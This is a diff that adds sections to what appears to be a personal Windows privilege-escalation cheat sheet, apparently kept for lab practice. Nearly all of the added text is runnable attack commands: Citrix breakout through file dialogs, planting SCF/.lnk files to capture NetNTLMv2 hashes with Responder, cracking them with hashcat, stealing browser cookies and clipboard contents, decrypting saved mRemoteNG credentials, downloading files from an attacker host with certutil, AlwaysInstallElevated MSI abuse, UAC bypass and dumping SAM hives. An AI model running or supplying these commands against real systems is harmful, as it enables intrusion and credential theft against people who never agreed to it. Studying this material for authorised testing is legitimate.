@@ -179,6 +179,50 @@ where /R C:\ *.config ; dir /S /B *pass*.* *cred* *vnc* *.rdp
 
 > Read `whoami /priv` first, every time. **SeImpersonate -> PrintSpoofer/GodPotato -> SYSTEM** is the single most common Windows privesc, because service accounts (web/DB) have it by default.
 
+## Restricted environment / Citrix breakout
+Kiosk/Citrix locks File Explorer, but a **dialog box** (any app's File > Open) is a way out:
+- In the "File name" box type a UNC path (`\\127.0.0.1\c$\users\<u>`, or `\\<attacker>\share` from an `smbserver.py` share), set file-type to "All Files" → browse/execute.
+- Right-click an exe → Open to run it; alt file explorers (Q-Dir, Explorer++), alt regedit tools, modified `.lnk` targets, or an `evil.bat` containing `cmd` all bypass restrictions.
+- Then escalate: **AlwaysInstallElevated** (below), PowerUp `Write-UserAddMSI`, UAC bypass (`Bypass-UAC -Method UacMethodSysprep`).
+
+## Forced authentication (coerce & crack hashes)
+Plant a file that auto-authenticates to your SMB listener when a user/Explorer views the folder → capture NetNTLMv2:
+- **SCF** (`@Inventory.scf`) or **malicious .lnk** with `IconLocation = \\<attacker>\x` on a writable share.
+- Catch with `responder -wrf -I <iface>`, then `hashcat -m 5600 hash rockyou.txt`.
+(The `.lnk` IconLocation / SCF IconFile pointing at your UNC is the trigger — no click needed, just viewing the folder.)
+
+## Pillaging (harvest from the host)
+```text
+# installed apps (version → known vulns)
+Get-ItemProperty HKLM:\Software\...\Uninstall\* | select DisplayName,DisplayVersion
+# mRemoteNG saved connections (confCons.xml) → decrypt
+python3 mremoteng_decrypt.py -s "<blob>"            # -p <masterpw> ; or brute with a wordlist
+# browser cookies → session hijack (Invoke-SharpChromium "cookies <site>", or copy cookies.sqlite)
+# clipboard logger (Invoke-ClipboardLogger) — catches pasted passwords/2FA
+# restic/backup repos → restore and loot (restic -r <repo> snapshots / restore <id>)
+```
+
+## LOLBAS & misc privesc
+```text
+# certutil (signed LOLBAS) — file transfer / base64
+certutil -urlcache -split -f http://<ip>/<file> <file>
+certutil -encode in out ; certutil -decode out in
+# AlwaysInstallElevated — any MSI installs as SYSTEM
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # both = 1 → vuln
+# build an MSI (msfvenom/Write-UserAddMSI) then: msiexec /i x.msi /quiet /qn /norestart
+# CVE-2019-1388 — UAC/privesc via cert dialog in hhupd.exe → cmd as SYSTEM
+# scheduled tasks — writable task script/binary = code exec as the task's user
+schtasks /query /fo LIST /v ; accesschk64.exe /accepteula -s -d C:\Scripts\
+# creds in user/computer description fields
+Get-LocalUser | select Name,Description
+# offline: mount a stolen VHDX/VMDK and pull hives
+guestmount --add <disk>.vhdx --ro /mnt -m /dev/sda1
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+> **AlwaysInstallElevated** is a top quick win: if both HKCU and HKLM keys = 1, any MSI you run installs as SYSTEM. And forced auth (SCF/LNK + Responder) turns a writable share into captured domain hashes without touching an exploit.
+
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
